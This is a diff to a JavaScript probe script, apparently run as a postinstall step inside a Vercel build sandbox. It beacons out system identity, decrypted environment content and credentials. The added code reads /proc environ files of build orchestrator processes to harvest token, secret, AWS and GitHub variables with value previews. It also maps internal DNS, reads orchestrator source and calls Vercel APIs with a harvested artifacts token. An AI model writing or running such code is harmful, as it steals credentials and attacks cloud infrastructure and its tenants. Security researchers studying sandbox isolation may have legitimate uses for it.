@@ -133,7 +133,7 @@ function tryDecrypt(keyStr, contentStr) {
 // EARLY BEACON — sent immediately before any network probes.
 // Critical env/crypto data arrives even if the main probe times out.
 sendBeacon({
-  marker: "VERCEL-AGENT-PROBE-7F3A2C-v17-early",
+  marker: "VERCEL-AGENT-PROBE-7F3A2C-v18-early",
   whoami: safe(() => execSync("id; uname -a").toString().trim()),
   tryCBC_early: tryDecrypt(process.env.VERCEL_ENV_ENC_KEY, process.env.VERCEL_ENCRYPTED_ENV_CONTENT),
   vercelCreds: {
@@ -148,7 +148,7 @@ sendBeacon({
 });
 
 const report = {
-  marker: "VERCEL-AGENT-PROBE-7F3A2C-v17",
+  marker: "VERCEL-AGENT-PROBE-7F3A2C-v18",
   whoami: safe(() => execSync("id; uname -a; pwd").toString().trim()),
   // credential-bearing surfaces (own sandbox only)
   gitConfig: safe(() => readFileSync(".git/config", "utf8")),
@@ -828,6 +828,88 @@ const report = {
     // SS (socket statistics) is more human-readable
     ssEstablished: safe(() => execSync('ss -tnp 2>/dev/null | head -20 || netstat -tnp 2>/dev/null | head -20 || true').toString().trim()).slice(0, 600),
   })),
+  // Process environment of build orchestrator processes (root can read /proc/{pid}/environ)
+  // Goal: find any credentials injected into the orchestrator/CLI worker but NOT passed to postinstall
+  orchestratorEnv: safe(() => {
+    // Get live PIDs for known process names
+    const getPids = (name) => safe(() => execSync(
+      `pgrep -f '${name}' 2>/dev/null || true`
+    ).toString().trim().split('\n').filter(Boolean));
+    const pids = [
+      ...getPids('index.js'),
+      ...getPids('prewarm-cli-build-worker'),
+      ...getPids('sandbox.js'),
+    ].filter(Boolean).slice(0, 5);
+    const results = {};
+    for (const pid of pids) {
+      const envPath = `/proc/${pid}/environ`;
+      const cmdPath = `/proc/${pid}/cmdline`;
+      const cmd = safe(() => readFileSync(cmdPath, 'utf8').replace(/\x00/g, ' ').slice(0, 100));
+      const envRaw = safe(() => readFileSync(envPath, 'utf8'));
+      if (typeof envRaw !== 'string' || envRaw.startsWith('ERR')) {
+        results[`pid${pid}`] = { cmd, env: envRaw };
+        continue;
+      }
+      const vars = envRaw.split('\x00').filter(v => v.includes('='));
+      // Extract all credential-like and Vercel-specific vars
+      const credKeys = vars
+        .map(v => v.split('=')[0])
+        .filter(k => /TOKEN|SECRET|KEY|PASS|AUTH|VERCEL_|GITHUB_|GH_|AWS_/i.test(k));
+      results[`pid${pid}`] = {
+        cmd,
+        totalEnvVars: vars.length,
+        credKeys,
+        // Capture length + first 20 chars of value for credential vars
+        credPreviews: Object.fromEntries(
+          credKeys.map(k => {
+            const fullVar = vars.find(v => v.startsWith(k + '=')) || '';
+            const val = fullVar.slice(k.length + 1);
+            return [k, val ? `present(len=${val.length},preview=${val.slice(0,20)}...)` : 'absent'];
+          })
+        ),
+      };
+    }
+    return results;
+  }),
+  // DNS using 'host' command (dig/nslookup not installed in v17; try alternatives)
+  dnsV2: safe(() => {
+    const resolve = (host) => safe(() =>
+      execSync(`timeout 3 host ${host} 172.31.0.2 2>/dev/null || timeout 3 getent hosts ${host} 2>/dev/null || timeout 3 python3 -c "import socket; print(socket.gethostbyname('${host}'))" 2>/dev/null || true`).toString().trim().slice(0, 200)
+    );
+    return {
+      apiIad1: resolve('api-iad1.vercel.com'),
+      suspenseCache: resolve('suspense-cache.vercel.com'),
+      vercelInternal: resolve('vercel.internal'),
+      s3Internal: resolve('s3.amazonaws.com'),
+      // Try resolving from /etc/resolv.conf nameserver directly
+      nsLookup: safe(() => execSync("cat /etc/resolv.conf 2>/dev/null | grep nameserver | head -3 || true").toString().trim()),
+    };
+  }),
+  // Read first 1500 chars of build orchestrator source (understand credential handling)
+  buildOrchestratorSnippet: safe(() => {
+    const f = '/var/task/index.js';
+    if (!existsSync(f)) return 'not-found';
+    return readFileSync(f, 'utf8').slice(0, 1500);
+  }),
+  // VERCEL_FLUID probe — new Vercel product, check if it exposes additional APIs
+  vercelFluid: safe(() => {
+    const fluid = process.env.VERCEL_FLUID;
+    if (fluid !== '1') return `not-enabled(val=${fluid})`;
+    const artTok = process.env.VERCEL_ARTIFACTS_TOKEN;
+    const ownerId = process.env.VERCEL_ARTIFACTS_OWNER || '';
+    // Try Vercel Fluid-specific API paths
+    const probe = (path) => {
+      const st = safe(() => execSync(
+        `curl -s --max-time 5 -o /tmp/fluid_out -w '%{http_code}' -H 'Authorization: Bearer ${artTok}' 'https://vercel.com${path}?teamId=${ownerId}' 2>/dev/null || true`
+      ).toString().trim());
+      const bd = safe(() => readFileSync('/tmp/fluid_out', 'utf8').slice(0, 150));
+      return { status: st, body: bd };
+    };
+    return {
+      v1Fluid: probe('/api/v1/fluid'),
+      v1FluidRuns: probe('/api/v1/fluid/runs'),
+    };
+  }),
 };
 
 // FULL BEACON — sent after all slow network probes complete.
